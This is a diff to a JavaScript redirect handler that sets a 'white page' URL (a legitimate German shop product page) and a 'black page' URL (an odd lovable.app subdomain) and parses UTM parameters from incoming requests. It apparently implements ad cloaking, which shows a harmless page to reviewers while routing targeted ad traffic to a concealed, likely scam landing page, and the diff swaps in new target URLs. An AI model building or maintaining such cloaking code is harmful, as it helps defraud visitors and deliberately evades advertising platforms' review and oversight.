@@ -1,7 +1,7 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.otto.de/p/seitenzugrollo-klemmfix-hitzeschutz-lichtblick-original-verdunkelnd-ohne-bohren-freihaengend-klemmfix-mit-thermobeschichtung-428837138/?variationId=1673585624";
-    const blackPageURL = "https://instentquzzz.lovable.app/?";
+    const whitePageURL = "https://www.babyshop.de/Meal-Time/Childrens-Tableware/Rice-Melamin-cup-letter-T/stars/brown-250ml::66274.html";
+    const blackPageURL = "https://lucurfreeeccssh.lovable.app/?";
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
@@ -26,6 +26,7 @@ export default function handler(req, res) {
     res.end();
 
   }
+
 
 
 
